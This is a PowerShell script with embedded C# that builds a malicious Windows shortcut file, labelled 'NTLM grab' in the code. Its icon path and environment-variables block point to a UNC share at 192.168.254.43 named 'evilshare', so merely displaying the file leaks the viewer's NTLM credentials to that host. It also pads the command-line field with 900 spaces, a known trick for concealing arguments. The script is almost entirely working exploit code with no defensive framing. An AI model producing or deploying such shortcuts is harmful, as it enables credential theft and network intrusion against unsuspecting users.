# CreateLnk.ps1 v6

$csharpCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace LnkCreator
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct ShellLinkHeader
    {
        public uint HeaderSize;
        public Guid LinkCLSID;
        public uint LinkFlags;
        public uint FileAttributes;
        public System.Runtime.InteropServices.ComTypes.FILETIME CreationTime;
        public System.Runtime.InteropServices.ComTypes.FILETIME AccessTime;
        public System.Runtime.InteropServices.ComTypes.FILETIME WriteTime;
        public uint FileSize;
        public uint IconIndex;
        public uint ShowCommand;
        public ushort HotKey;
        public ushort Reserved1;
        public uint Reserved2;
        public uint Reserved3;
    }

    public static class Constants
    {
        public const uint HAS_LINK_TARGET_IDLIST = 0x00000001;
        public const uint HAS_LINK_INFO = 0x00000002;
        public const uint HAS_NAME = 0x00000004;
        public const uint HAS_RELATIVE_PATH = 0x00000008;
        public const uint HAS_WORKING_DIR = 0x00000010;
        public const uint HAS_ARGUMENTS = 0x00000020;
        public const uint HAS_ICON_LOCATION = 0x00000040;
        public const uint IS_UNICODE = 0x00000080;
        public const uint FORCE_NO_LINKINFO = 0x00000100;
        public const uint HAS_EXP_STRING = 0x00000200;
        public const uint RUN_IN_SEPARATE_PROCESS = 0x00000400;
        public const uint HAS_LOGO3ID = 0x00000800;
        public const uint HAS_DARWIN_ID = 0x00001000;
        public const uint RUN_AS_USER = 0x00002000;
        public const uint HAS_EXP_ICON = 0x00004000;
        public const uint NO_PIDL_ALIAS = 0x00008000;
        public const uint FORCE_USHORTCUT = 0x00010000;
        public const uint RUN_WITH_SHIMLAYER = 0x00020000;
        public const uint FORCE_NO_LINKTRACK = 0x00040000;
        public const uint ENABLE_TARGET_METADATA = 0x00080000;
        public const uint DISABLE_LINK_PATH_TRACKING = 0x00100000;
        public const uint DISABLE_KNOWNFOLDER_TRACKING = 0x00200000;
        public const uint DISABLE_KNOWNFOLDER_ALIAS = 0x00400000;
        public const uint ALLOW_LINK_TO_LINK = 0x00800000;
        public const uint UNALIAS_ON_SAVE = 0x01000000;
        public const uint PREFER_ENVIRONMENT_PATH = 0x02000000;
        public const uint KEEP_LOCAL_IDLIST_FOR_UNC = 0x04000000;

        public const uint SW_SHOWNORMAL = 0x00000001;
        public const uint SW_SHOWMAXIMIZED = 0x00000003;
        public const uint SW_SHOWMINNOACTIVE = 0x00000007;

        public const uint ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE = 0xA0000001;
        public const uint FILE_ATTRIBUTE_NORMAL = 0x00000080;
    }

    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FileTimeToSystemTime(
            ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime,
            out SYSTEMTIME lpSystemTime);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SystemTimeToFileTime(
            ref SYSTEMTIME lpSystemTime, 
            out System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime);

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEMTIME
        {
            public ushort wYear;
            public ushort wMonth;
            public ushort wDayOfWeek;
            public ushort wDay;
            public ushort wHour;
            public ushort wMinute;
            public ushort wSecond;
            public ushort wMilliseconds;
        }

        public static void Main()
        {
            string lnkFilePath = "poc.lnk";

            try
            {
                using (var fs = new FileStream(lnkFilePath, FileMode.Create, FileAccess.Write))
                using (var bw = new BinaryWriter(fs))
                {
                    ShellLinkHeader header = new ShellLinkHeader
                    {
                        HeaderSize = 0x0000004C,
                        LinkCLSID = new Guid(0x00021401, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46),
                        LinkFlags = Constants.HAS_NAME |
                                  Constants.HAS_ARGUMENTS |
                                  Constants.HAS_ICON_LOCATION |
                                  Constants.IS_UNICODE |
                                  Constants.HAS_EXP_STRING,
                        FileAttributes = Constants.FILE_ATTRIBUTE_NORMAL,
                        FileSize = 0,
                        IconIndex = 0,
                        ShowCommand = Constants.SW_SHOWNORMAL,
                        HotKey = 0,
                        Reserved1 = 0,
                        Reserved2 = 0,
                        Reserved3 = 0
                    };

                    SYSTEMTIME st = new SYSTEMTIME();
                    st.wYear = (ushort)DateTime.Now.Year;
                    st.wMonth = (ushort)DateTime.Now.Month;
                    st.wDay = (ushort)DateTime.Now.Day;
                    st.wHour = (ushort)DateTime.Now.Hour;
                    st.wMinute = (ushort)DateTime.Now.Minute;
                    st.wSecond = (ushort)DateTime.Now.Second;
                    st.wMilliseconds = (ushort)DateTime.Now.Millisecond;

                    SystemTimeToFileTime(ref st, out header.CreationTime);
                    SystemTimeToFileTime(ref st, out header.AccessTime);
                    SystemTimeToFileTime(ref st, out header.WriteTime);

                    WriteStruct(bw, header);

                    string description = "NTLM grab";
                    bw.Write((ushort)description.Length);
                    bw.Write(Encoding.Unicode.GetBytes(description));

                    string calcCmd = "";
                    char[] cmdLineBuffer = new char[900];
                    Array.Fill(cmdLineBuffer, ' ', 0, 900 - calcCmd.Length);
                    calcCmd.CopyTo(0, cmdLineBuffer, 900 - calcCmd.Length, calcCmd.Length);
                    bw.Write((ushort)cmdLineBuffer.Length);
                    bw.Write(Encoding.Unicode.GetBytes(new string(cmdLineBuffer)));

                    string iconPath = "\\\\192.168.254.43\\evilshare\\test.exe,0";
                    bw.Write((ushort)iconPath.Length);
                    bw.Write(Encoding.Unicode.GetBytes(iconPath));

                    string envUNC = "\\\\192.168.254.43\\evilshare\\test.exe";
                    uint envBlockSize = 0x00000314;
                    uint envSignature = Constants.ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;

                    Console.WriteLine("Creating Environment Variables Data Block:");
                    Console.WriteLine("  Using fixed block size: 0x" + envBlockSize.ToString("X8") + " (" + envBlockSize + " bytes)");

                    bw.Write(envBlockSize);
                    Console.WriteLine("  Write block size: " + sizeof(uint) + " bytes written");

                    bw.Write(envSignature);
                    Console.WriteLine("  Wrote block signature: " + sizeof(uint) + " bytes written");

                    byte[] ansiBuffer = new byte[260];
                    Encoding.ASCII.GetBytes(envUNC).CopyTo(ansiBuffer, 0);
                    bw.Write(ansiBuffer);
                    Console.WriteLine("  Write TargetAnsi: " + ansiBuffer.Length + " bytes written (fixed 260 bytes)");

                    char[] unicodeBuffer = new char[260];
                    envUNC.CopyTo(0, unicodeBuffer, 0, Math.Min(envUNC.Length, 260));
                    bw.Write(Encoding.Unicode.GetBytes(unicodeBuffer));
                    Console.WriteLine("  Write TargetUnicode: " + (unicodeBuffer.Length * 2) + " bytes written (fixed 520 bytes)");
                }

                Console.WriteLine("LNK file created successfully: " + lnkFilePath);
                Console.WriteLine("Command line buffer size: " + 900 + " bytes");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        private static void WriteStruct<T>(BinaryWriter writer, T structure)
        {
            int size = Marshal.SizeOf<T>();
            byte[] arr = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(structure, ptr, true);
            Marshal.Copy(ptr, arr, 0, size);
            Marshal.FreeHGlobal(ptr);
            writer.Write(arr);
        }
    }
}
"@

# Compile and run the C# code
Add-Type -TypeDefinition $csharpCode -Language CSharp

# Execute the program
[LnkCreator.Program]::Main()
